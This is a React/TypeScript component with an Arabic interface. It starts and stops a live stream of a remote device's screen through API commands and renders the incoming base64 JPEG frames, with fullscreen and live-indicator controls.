import { useState, useEffect, useRef } from 'react';
import { sendCommand } from '../../../services/api';
import { onSocketEvent } from '../../../services/socket';
import { Button } from '../../ui/Button';
import { Monitor, Maximize, Minimize, Radio, StopCircle, ArrowRight } from 'lucide-react';

interface Props {
  token: string;
  onBack: () => void;
}

export function StreamScreenPanel({ token, onBack }: Props) {
  const [isActive, setIsActive] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [isFullscreen, setIsFullscreen] = useState(false);
  const [lastFrame, setLastFrame] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const containerRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const unsub = onSocketEvent('stream:data', (data: unknown) => {
      const d = data as { image?: string; data?: string };
      const base64 = d.image || d.data;
      if (base64) {
        setLastFrame(`data:image/jpeg;base64,${base64}`);
        setError(null);
      }
    });
    return () => unsub();
  }, []);

  const startStream = async () => {
    setIsLoading(true);
    setError(null);
    try {
      await sendCommand(token, 'stream_screen');
      setIsActive(true);
    } catch {
      setError('فشل بدء البث');
    } finally {
      setIsLoading(false);
    }
  };

  const stopStream = async () => {
    setIsLoading(true);
    try {
      await sendCommand(token, 'stop_stream');
      setIsActive(false);
      setLastFrame(null);
    } catch { /* ignore */ }
    finally { setIsLoading(false); }
  };

  const toggleFullscreen = () => {
    if (!containerRef.current) return;
    if (!isFullscreen) containerRef.current.requestFullscreen?.();
    else document.exitFullscreen?.();
    setIsFullscreen(!isFullscreen);
  };

  return (
    <div className="space-y-4">
      <div className="flex items-center gap-3">
        <button onClick={onBack} className="p-2 rounded-xl hover:bg-surface-100 dark:hover:bg-surface-800 transition-colors">
          <ArrowRight size={20} className="text-surface-600 dark:text-surface-400" />
        </button>
        <Monitor size={20} className="text-emerald-500" />
        <h2 className="text-lg font-bold text-surface-900 dark:text-white">بث الشاشة المباشر</h2>
        {isActive && <span className="relative flex h-3 w-3"><span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75" /><span className="relative inline-flex rounded-full h-3 w-3 bg-red-500" /></span>}
      </div>

      <div className="flex gap-2">
        {isActive ? (
          <>
            <Button variant="ghost" size="sm" icon={<Maximize size={16} />} onClick={toggleFullscreen}>
              {isFullscreen ? 'تصغير' : 'ملء الشاشة'}
            </Button>
            <Button variant="danger" size="sm" icon={<StopCircle size={16} />} onClick={stopStream} loading={isLoading}>إيقاف البث</Button>
          </>
        ) : (
          <Button icon={<Radio size={16} />} onClick={startStream} loading={isLoading} className="flex-1">
            بدء البث
          </Button>
        )}
      </div>

      {error && <div className="p-3 rounded-xl bg-rose-50 dark:bg-rose-500/10 border border-rose-200 dark:border-rose-500/20 text-sm text-rose-600 dark:text-rose-400">{error}</div>}

      <div ref={containerRef} className="relative bg-surface-900 rounded-2xl overflow-hidden border border-surface-200 dark:border-surface-800" style={{ minHeight: 400 }}>
        {lastFrame ? (
          <img src={lastFrame} alt="Live Stream" className="w-full h-full object-contain" />
        ) : (
          <div className="absolute inset-0 flex flex-col items-center justify-center text-surface-500">
            <Monitor size={48} className="mb-4 opacity-30" />
            <p className="text-sm">{isActive ? 'في انتظار الإطارات...' : 'اضغط "بدء البث" لمشاهدة شاشة الجهاز'}</p>
          </div>
        )}
        {isActive && (
          <div className="absolute top-4 right-4 flex items-center gap-2 bg-black/50 px-3 py-1.5 rounded-full">
            <span className="relative flex h-2 w-2"><span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75" /><span className="relative inline-flex rounded-full h-2 w-2 bg-red-500" /></span>
            <span className="text-xs text-white font-medium">LIVE</span>
          </div>
        )}
      </div>
    </div>
  );
}
